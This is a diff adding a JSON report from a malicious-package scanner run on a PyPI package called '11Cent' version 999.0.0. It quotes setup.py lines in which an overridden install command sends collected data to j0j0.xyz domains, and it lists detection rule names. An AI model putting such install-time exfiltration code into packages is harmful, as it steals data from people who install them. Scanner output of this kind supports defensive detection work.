@@ -1,0 +1,41 @@
+{
+    "issues": 4,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://j0j0.xyz/11cent\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"http://11cent.j0j0.xyz\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(name='11Cent',\n      version='999.0.0',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://j0j0.xyz/11cent\",params = ploads)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/11Cent-999.0.0"
+}
